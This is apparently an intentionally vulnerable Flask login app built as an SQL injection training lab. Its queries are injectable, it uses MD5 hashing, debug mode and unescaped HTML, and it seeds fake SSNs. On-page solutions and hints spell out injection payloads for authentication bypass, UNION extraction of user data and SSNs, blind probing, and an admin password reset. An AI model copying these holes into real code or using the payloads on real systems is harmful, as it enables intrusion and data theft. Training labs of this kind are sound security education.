from flask import Flask, request, redirect, render_template_string, session, url_for, flash
import sqlite3
import hashlib
import os
import time
from urllib.parse import unquote

app = Flask(__name__)
app.secret_key = "vulnerable_demo_key_but_now_stronger!"  # Still not production-ready
DB = 'vuln.db'

def hash_md5(password):
    return hashlib.md5(password.encode()).hexdigest()

# Enhanced fake user data with more variety
FAKE_USERS = [
    ("admin", "admin@example.com", "1234567890", hash_md5("admin123"), "CEO"),
    ("john_doe", "john@example.com", "9876543210", hash_md5("password123"), "Developer"),
    ("alice", "alice@demo.com", "8887776666", hash_md5("qwerty"), "Designer"),
    ("bob_smith", "bob@gmail.com", "7778889999", hash_md5("letmein"), "Manager"),
    ("charlie", "charlie@somewhere.com", "9990001111", hash_md5("123456"), "Intern"),
    ("' OR '1'='1", "hacker@example.com", "0000000000", hash_md5("hacked"), "Hacker"),
    ("'; DROP TABLE users;--", "danger@example.com", "1111111111", hash_md5("dangerous"), "Malicious"),
]

def init_db():
    if os.path.exists(DB):
        return
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            email TEXT NOT NULL,
            mobile TEXT NOT NULL,
            password TEXT NOT NULL,
            role TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE sensitive_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            ssn TEXT,
            credit_card TEXT,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )
    ''')
    c.executemany("INSERT INTO users (username, email, mobile, password, role) VALUES (?, ?, ?, ?, ?)", FAKE_USERS)
    
    # Add sensitive data
    c.execute("INSERT INTO sensitive_data (user_id, ssn, credit_card) VALUES (1, '123-45-6789', '4111 1111 1111 1111')")
    c.execute("INSERT INTO sensitive_data (user_id, ssn, credit_card) VALUES (2, '987-65-4321', '5500 0000 0000 0004')")
    
    conn.commit()
    conn.close()

init_db()

@app.route('/', methods=['GET', 'POST'])
def login():
    msg = ''
    attack_demo = request.args.get('demo', '')
    username_prefill = unquote(request.args.get('username', ''))
    
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        hashed = hash_md5(password)

        # ❌ Still vulnerable to SQLi - this is intentional for the lab
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{hashed}'"
        conn = sqlite3.connect(DB)
        cursor = conn.cursor()

        try:
            print(f"[DEBUG] SQL: {query}")
            start_time = time.time()
            cursor.execute(query)
            result = cursor.fetchone()
            elapsed_time = time.time() - start_time
        except Exception as e:
            print(f"[ERROR] {e}")
            result = None
            elapsed_time = 0
        conn.close()

        if result:
            session['user'] = result[1]  # username
            session['role'] = result[5]   # role
            flash('Login successful!', 'success')
            return redirect(url_for('dashboard'))
        else:
            msg = f'''
            <div class="alert alert-danger animate__animated animate__shakeX">
                <strong>❌ Login failed!</strong> 
                <div class="mt-2">Query took {elapsed_time:.4f} seconds</div>
                {f'<div class="mt-2"><small>Executed query: <code>{query}</code></small></div>' if 'show_query' in request.form else ''}
            </div>
            '''

    return render_template_string('''
    <!doctype html>
    <html lang="en">
    <head>
        <title>Advanced SQLi Lab</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --primary-color: #6c5ce7;
                --secondary-color: #a29bfe;
                --dark-color: #2d3436;
                --light-color: #f5f6fa;
            }
            body {
                background: linear-gradient(135deg, var(--light-color), white);
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
            }
            .login-container {
                max-width: 1000px;
                margin: auto;
                padding: 2rem;
                border-radius: 1rem;
                background-color: white;
                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                transition: all 0.3s ease;
            }
            .login-container:hover {
                box-shadow: 0 15px 40px rgba(0,0,0,0.15);
            }
            .login-box {
                padding: 2rem;
            }
            .instructions {
                background-color: #f8f9fa;
                border-radius: 0.5rem;
                padding: 1.5rem;
                height: 100%;
            }
            .tab-content {
                padding: 1.5rem 0;
            }
            .nav-tabs .nav-link.active {
                font-weight: bold;
                border-bottom: 3px solid var(--primary-color);
            }
            .attack-demo {
                background-color: #fff8e1;
                border-left: 4px solid #ffc107;
                padding: 0.75rem;
                margin-bottom: 1rem;
                border-radius: 0 0.25rem 0.25rem 0;
            }
            .pulse {
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { box-shadow: 0 0 0 0 rgba(108, 92, 231, 0.4); }
                70% { box-shadow: 0 0 0 10px rgba(108, 92, 231, 0); }
                100% { box-shadow: 0 0 0 0 rgba(108, 92, 231, 0); }
            }
            .btn-primary {
                background-color: var(--primary-color);
                border-color: var(--primary-color);
            }
            .btn-primary:hover {
                background-color: #5649c0;
                border-color: #5649c0;
            }
            .badge-vuln {
                background-color: #ff6b6b;
            }
            .floating { 
                animation-name: floating;
                animation-duration: 3s;
                animation-iteration-count: infinite;
                animation-timing-function: ease-in-out;
            }
            @keyframes floating {
                0% { transform: translate(0,  0px); }
                50%  { transform: translate(0, 15px); }
                100%   { transform: translate(0, -0px); }   
            }
        </style>
    </head>
    <body>
        <div class="container my-5">
            <div class="login-container">
                <div class="row">
                    <div class="col-md-6 login-box">
                        <div class="text-center mb-4">
                            <h1 class="text-primary"><i class="fas fa-database me-2"></i>SQLi Lab</h1>
                            <p class="text-muted">Learn SQL injection through interactive challenges</p>
                        </div>
                        
                        {% if attack_demo %}
                        <div class="attack-demo animate__animated animate__fadeIn">
                            <h5><i class="fas fa-bug me-2"></i>Demo Payload</h5>
                            <code>{{ attack_demo }}</code>
                            <button onclick="copyToClipboard('{{ attack_demo }}')" class="btn btn-sm btn-outline-secondary ms-2">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                        {% endif %}
                        
                        <form method="POST">
                            <div class="mb-3">
                                <label class="form-label">Username</label>
                                <input name="username" class="form-control" placeholder="Enter username" 
                                    value="{{ username_prefill }}" required>
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Password</label>
                                <input name="password" type="password" class="form-control" placeholder="Enter password" required>
                            </div>
                            <div class="d-flex justify-content-between align-items-center mb-3">
                                <div class="form-check">
                                    <input class="form-check-input" type="checkbox" name="show_query" id="showQuery">
                                    <label class="form-check-label" for="showQuery">Show SQL query</label>
                                </div>
                                <button type="submit" class="btn btn-primary px-4 animate__animated animate__pulse">
                                    <i class="fas fa-sign-in-alt me-2"></i>Login
                                </button>
                            </div>
                        </form>
                        
                        {{ msg|safe }}
                        
                        <div class="mt-4 text-center">
                            <button class="btn btn-sm btn-outline-danger" data-bs-toggle="modal" data-bs-target="#hintModal">
                                <i class="fas fa-lightbulb me-1"></i>Need a hint?
                            </button>
                        </div>
                    </div>
                    
                    <div class="col-md-6">
                        <div class="instructions">
                            <h3 class="mb-3"><i class="fas fa-graduation-cap me-2"></i>Instructions</h3>
                            
                            <ul class="nav nav-tabs" id="instructionTabs" role="tablist">
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link active" id="basics-tab" data-bs-toggle="tab" data-bs-target="#basics" type="button">Basics</button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link" id="challenges-tab" data-bs-toggle="tab" data-bs-target="#challenges" type="button">Challenges</button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link" id="solutions-tab" data-bs-toggle="tab" data-bs-target="#solutions" type="button">Solutions</button>
                                </li>
                            </ul>
                            
                            <div class="tab-content" id="instructionTabsContent">
                                <div class="tab-pane fade show active" id="basics" role="tabpanel">
                                    <p>This is an <strong>intentionally vulnerable</strong> login system to demonstrate SQL injection.</p>
                                    <p>Try to bypass authentication or extract data by manipulating the SQL query.</p>
                                    
                                    <div class="alert alert-warning mt-3">
                                        <i class="fas fa-exclamation-triangle me-2"></i>
                                        <strong>Vulnerable Query:</strong>
                                        <code>SELECT * FROM users WHERE username = '[user_input]' AND password = '[md5_hash]'</code>
                                    </div>
                                    
                                    <h5 class="mt-4"><i class="fas fa-bug me-2"></i>Attack Types</h5>
                                    <ul>
                                        <li><strong>Authentication Bypass:</strong> Log in without valid credentials</li>
                                        <li><strong>Data Extraction:</strong> Retrieve hidden data from the database</li>
                                        <li><strong>Blind SQLi:</strong> Infer data from response times or behavior</li>
                                    </ul>
                                </div>
                                
                                <div class="tab-pane fade" id="challenges" role="tabpanel">
                                    <div class="card mb-2">
                                        <div class="card-body">
                                            <h5 class="card-title">1. Basic Bypass</h5>
                                            <p>Log in without knowing any credentials.</p>
                                            <span class="badge bg-primary">Easy</span>
                                        </div>
                                    </div>
                                    
                                    <div class="card mb-2">
                                        <div class="card-body">
                                            <h5 class="card-title">2. Extract All Users</h5>
                                            <p>Retrieve a list of all usernames in the system.</p>
                                            <span class="badge bg-warning text-dark">Medium</span>
                                        </div>
                                    </div>
                                    
                                    <div class="card mb-2">
                                        <div class="card-body">
                                            <h5 class="card-title">3. Find Admin Email</h5>
                                            <p>Discover the admin's email address.</p>
                                            <span class="badge bg-warning text-dark">Medium</span>
                                        </div>
                                    </div>
                                    
                                    <div class="card">
                                        <div class="card-body">
                                            <h5 class="card-title">4. Steal SSN</h5>
                                            <p>Extract the admin's social security number.</p>
                                            <span class="badge bg-danger">Hard</span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="tab-pane fade" id="solutions" role="tabpanel">
                                    <div class="alert alert-info">
                                        Try these only after attempting the challenges yourself!
                                    </div>
                                    
                                    <h5>1. Basic Bypass</h5>
                                    <p>Username: <code>' OR '1'='1'--</code></p>
                                    <p>Password: <em>anything</em></p>
                                    
                                    <h5 class="mt-3">2. Extract All Users</h5>
                                    <p>Username: <code>' UNION SELECT null,username,null,null,null,null FROM users--</code></p>
                                    
                                    <h5 class="mt-3">3. Find Admin Email</h5>
                                    <p>Username: <code>' UNION SELECT null,email,null,null,null,null FROM users WHERE username='admin'--</code></p>
                                    
                                    <h5 class="mt-3">4. Steal SSN</h5>
                                    <p>Username: <code>' UNION SELECT null,u.username,s.ssn,null,null,null FROM users u JOIN sensitive_data s ON u.id=s.user_id WHERE u.username='admin'--</code></p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="text-center mt-4 text-muted">
                <small>This is a safe training environment. Never test on real systems without permission.</small>
            </div>
        </div>
        
        <!-- Hint Modal -->
        <div class="modal fade" id="hintModal" tabindex="-1">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title"><i class="fas fa-lightbulb me-2"></i>SQL Injection Hints</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body">
                        <ul class="nav nav-pills mb-3" id="hint-tabs" role="tablist">
                            <li class="nav-item" role="presentation">
                                <button class="nav-link active" data-bs-toggle="pill" data-bs-target="#hint-basic">Basic</button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" data-bs-toggle="pill" data-bs-target="#hint-union">UNION</button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" data-bs-toggle="pill" data-bs-target="#hint-blind">Blind</button>
                            </li>
                        </ul>
                        
                        <div class="tab-content">
                            <div class="tab-pane fade show active" id="hint-basic">
                                <p>Try to break out of the SQL query context:</p>
                                <code>username: ' OR 1=1--</code>
                                <p class="mt-2">The <code>--</code> comments out the rest of the query.</p>
                            </div>
                            <div class="tab-pane fade" id="hint-union">
                                <p>UNION attacks require matching the number of columns:</p>
                                <code>' UNION SELECT null,null,null,null,null,null--</code>
                                <p class="mt-2">Replace nulls with column names to extract data.</p>
                            </div>
                            <div class="tab-pane fade" id="hint-blind">
                                <p>For blind SQLi, use time-based techniques:</p>
                                <code>' UNION SELECT null,null,null,null,null,null FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a' AND 1=SLEEP(5)--</code>
                                <p class="mt-2">If the response is delayed, the condition is true.</p>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>
        
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            function copyToClipboard(text) {
                navigator.clipboard.writeText(text).then(() => {
                    alert('Copied to clipboard!');
                });
            }
            
            // Animate elements when they come into view
            document.addEventListener('DOMContentLoaded', function() {
                const observer = new IntersectionObserver((entries) => {
                    entries.forEach(entry => {
                        if (entry.isIntersecting) {
                            entry.target.classList.add('animate__animated', 'animate__fadeInUp');
                        }
                    });
                }, { threshold: 0.1 });
                
                document.querySelectorAll('.card, .alert').forEach(el => {
                    observer.observe(el);
                });
            });
        </script>
    </body>
    </html>
    ''', msg=msg, attack_demo=attack_demo, username_prefill=username_prefill)

@app.route('/dashboard')
def dashboard():
    user = session.get('user')
    if not user:
        return redirect('/')
    
    # Get user details (vulnerable to 2nd order SQLi)
    conn = sqlite3.connect(DB)
    cursor = conn.cursor()
    query = f"SELECT username, email, mobile, role FROM users WHERE username = '{user}'"
    cursor.execute(query)
    user_data = cursor.fetchone()
    conn.close()
    
    if not user_data:
        return redirect('/')
    
    username, email, mobile, role = user_data
    
    return render_template_string('''
    <!doctype html>
    <html lang="en">
    <head>
        <title>Dashboard - SQLi Lab</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            body {
                background-color: #f8f9fa;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            .navbar {
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .profile-card {
                border-radius: 1rem;
                box-shadow: 0 10px 20px rgba(0,0,0,0.1);
                transition: all 0.3s ease;
                overflow: hidden;
            }
            .profile-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 30px rgba(0,0,0,0.15);
            }
            .profile-header {
                background: linear-gradient(135deg, #6c5ce7, #a29bfe);
                color: white;
                padding: 2rem;
                text-align: center;
            }
            .profile-avatar {
                width: 100px;
                height: 100px;
                border-radius: 50%;
                border: 4px solid white;
                margin: 0 auto 1rem;
                background-color: #f8f9fa;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 2.5rem;
                color: #6c5ce7;
            }
            .vulnerable-data {
                background-color: #fff8e1;
                border-left: 4px solid #ffc107;
                padding: 0.75rem;
                margin: 1rem 0;
                border-radius: 0 0.25rem 0.25rem 0;
            }
            .floating-icon {
                animation: floating 3s ease-in-out infinite;
            }
            @keyframes floating {
                0% { transform: translateY(0px); }
                50% { transform: translateY(-10px); }
                100% { transform: translateY(0px); }
            }
        </style>
    </head>
    <body>
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
            <div class="container">
                <a class="navbar-brand" href="#"><i class="fas fa-database me-2"></i>SQLi Lab</a>
                <div class="d-flex">
                    <span class="navbar-text me-3">
                        Logged in as: <strong>{{ username }}</strong>
                    </span>
                    <a class="btn btn-sm btn-outline-light" href="/">
                        <i class="fas fa-sign-out-alt me-1"></i>Logout
                    </a>
                </div>
            </div>
        </nav>
        
        <div class="container py-5">
            <div class="row justify-content-center">
                <div class="col-md-8">
                    <div class="profile-card mb-5 animate__animated animate__fadeIn">
                        <div class="profile-header">
                            <div class="profile-avatar">
                                <i class="fas fa-user"></i>
                            </div>
                            <h3>{{ username }}</h3>
                            <span class="badge bg-light text-dark">{{ role }}</span>
                        </div>
                        
                        <div class="card-body">
                            <div class="alert alert-success animate__animated animate__bounceIn">
                                <i class="fas fa-check-circle me-2"></i>
                                <strong>Success!</strong> You exploited a SQL injection vulnerability.
                            </div>
                            
                            <h4 class="mt-4"><i class="fas fa-id-card me-2"></i>Profile Information</h4>
                            <table class="table table-bordered mt-3">
                                <tr>
                                    <th width="30%">Email</th>
                                    <td>{{ email }}</td>
                                </tr>
                                <tr>
                                    <th>Mobile</th>
                                    <td>{{ mobile }}</td>
                                </tr>
                                <tr>
                                    <th>Role</th>
                                    <td>{{ role }}</td>
                                </tr>
                            </table>
                            
                            <div class="vulnerable-data animate__animated animate__pulse animate__infinite">
                                <h5><i class="fas fa-exclamation-triangle me-2"></i>Vulnerable Query</h5>
                                <code>SELECT username, email, mobile, role FROM users WHERE username = '{{ user }}'</code>
                            </div>
                            
                            <div class="mt-4">
                                <h4><i class="fas fa-bug me-2"></i>Try These Attacks</h4>
                                <div class="list-group mt-3">
                                    <a href="/?demo=' UNION SELECT null,ssn,null,null FROM sensitive_data--&username=hacker" 
                                       class="list-group-item list-group-item-action">
                                        <i class="fas fa-credit-card me-2 floating-icon" style="animation-delay: 0.2s"></i>
                                        Extract SSN and credit card numbers
                                    </a>
                                    <a href="/?demo=' UNION SELECT null,group_concat(username),group_concat(password),null FROM users--&username=hacker" 
                                       class="list-group-item list-group-item-action">
                                        <i class="fas fa-users me-2 floating-icon" style="animation-delay: 0.4s"></i>
                                        Dump all usernames and passwords
                                    </a>
                                    <a href="/?demo='; UPDATE users SET password='5f4dcc3b5aa765d61d8327deb882cf99' WHERE username='admin'--&username=hacker" 
                                       class="list-group-item list-group-item-action">
                                        <i class="fas fa-user-shield me-2 floating-icon" style="animation-delay: 0.6s"></i>
                                        Change admin password to "password"
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="card border-danger animate__animated animate__fadeIn">
                        <div class="card-header bg-danger text-white">
                            <i class="fas fa-shield-alt me-2"></i>How to Fix These Vulnerabilities
                        </div>
                        <div class="card-body">
                            <ol>
                                <li class="mb-2">
                                    <strong>Use Parameterized Queries:</strong>
                                    <code>cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, hashed))</code>
                                </li>
                                <li class="mb-2">
                                    <strong>ORM Libraries:</strong> Use SQLAlchemy, Django ORM, etc.
                                </li>
                                <li class="mb-2">
                                    <strong>Input Validation:</strong> Whitelist allowed characters
                                </li>
                                <li class="mb-2">
                                    <strong>Least Privilege:</strong> Database user should have minimal permissions
                                </li>
                                <li>
                                    <strong>Web Application Firewall:</strong> Can help block SQLi attempts
                                </li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    ''', username=username, email=email, mobile=mobile, role=role, user=user)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
